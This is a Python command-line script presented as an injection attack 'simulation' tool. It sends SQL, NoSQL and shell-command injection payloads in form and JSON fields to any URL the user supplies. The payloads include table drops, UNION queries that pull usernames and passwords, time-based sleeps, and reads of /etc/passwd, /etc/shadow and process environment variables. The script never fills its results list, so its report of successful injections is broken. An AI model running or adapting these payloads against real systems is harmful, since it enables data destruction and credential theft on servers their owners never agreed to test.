import requests
import json
import time
import argparse
import random

def code_injection_attack(url, attack_type, num_attempts=10, delay=1):
    """
    Executes code injection attacks against the target URL
    
    Args:
        url: Target endpoint URL
        attack_type: Type of injection attack (sql, nosql, cmd)
        num_attempts: Number of attack attempts
        delay: Delay between requests in seconds
    """
    # Common payloads for different types of injection attacks
    sql_injection_payloads = [
        "' OR 1=1 --",
        "'; DROP TABLE users; --",
        "' UNION SELECT username, password FROM users --",
        "admin' --",
        "' OR '1'='1",
        "'; WAITFOR DELAY '0:0:10'--",
        "1'; SELECT @@version; --"
    ]
    
    nosql_injection_payloads = [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$where": "sleep(10000)"}',
        '{"$where": "this.password == this.username"}',
        '{"username": {"$regex": "admin"}}',
        '{"$where": "function(){return 1;}"}',
        '{"$where": "new Date()"}'
    ]
    
    cmd_injection_payloads = [
        "; ls -la",
        "& cat /etc/passwd",
        "| cat /proc/self/environ",
        "; env",
        "` cat /etc/passwd `",
        "$(cat /etc/passwd)",
        "|| cat /etc/shadow"
    ]
    
    # Select the appropriate payload list
    if attack_type.lower() == "sql":
        payloads = sql_injection_payloads
        print("Performing SQL Injection attacks")
    elif attack_type.lower() == "nosql":
        payloads = nosql_injection_payloads
        print("Performing NoSQL Injection attacks")
    elif attack_type.lower() == "cmd":
        payloads = cmd_injection_payloads
        print("Performing Command Injection attacks")
    else:
        print(f"Unknown attack type: {attack_type}")
        return
    
    # Randomize and select payloads based on num_attempts
    selected_payloads = random.sample(payloads, min(num_attempts, len(payloads)))
    if num_attempts > len(payloads):
        # Add repeats if we need more attempts than we have payloads
        selected_payloads.extend(random.choices(payloads, k=num_attempts-len(payloads)))
    
    results = []
    
    # For each payload, attempt the injection against form fields
    for i, payload in enumerate(selected_payloads):
        print(f"\nAttempt {i+1}/{num_attempts}: Sending payload: {payload}")
        
        data = {
            "product_id": f"exploit_{i}; {payload}",
            "review": f"Test comment {payload}",
            "username": f"user{i}"
        }
        
        # Try sending as form data
        try:
            response = requests.post(url, data=data, timeout=10)
            status = response.status_code
            content_length = len(response.text)
            print(f"Form data response: Status {status}, Length: {content_length}")
            print("Response snippet:", response.text[:300])
        except Exception as e:
            print(f"Form request error: {str(e)}")
        
        # Try sending as JSON
        try:
            response = requests.post(url, json=data, timeout=10)
            status = response.status_code
            content_length = len(response.text)
            print(f"JSON data response: Status {status}, Length: {content_length}")
            print("Response snippet:", response.text[:300])
        except Exception as e:
            print(f"JSON request error: {str(e)}")
        
        # Introduce delay to avoid overwhelming the server
        if i < num_attempts - 1:
            time.sleep(delay)
    
    # Print summary
    print("\n----- Code Injection Attack Results -----")
    print(f"Attack Type: {attack_type}")
    print(f"Target URL: {url}")
    print(f"Attempts: {num_attempts}")
    
    # Count successful attacks (this is just an example - adjust based on your application)
    # Here we're assuming responses with abnormal lengths might indicate successful injection
    base_content_length = results[0]["content_length"] if results else 0
    potential_success = sum(1 for r in results if abs(r["content_length"] - base_content_length) > 100)
    print(f"Potential successful injections: {potential_success}")
    
    return results

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Code Injection Attack Simulation Tool")
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--type", required=True, choices=["sql", "nosql", "cmd"], help="Type of injection attack")
    parser.add_argument("--attempts", type=int, default=7, help="Number of attack attempts")
    parser.add_argument("--delay", type=float, default=1.0, help="Delay between requests in seconds")
    
    args = parser.parse_args()
    
    print(f"Starting code injection attack simulation against {args.url}")
    print(f"Attack type: {args.type}")
    print(f"Attack attempts: {args.attempts}")
    print("Press Ctrl+C to abort\n")
    
    try:
        code_injection_attack(args.url, args.type, args.attempts, args.delay)
    except KeyboardInterrupt:
        print("\nSimulation aborted by user")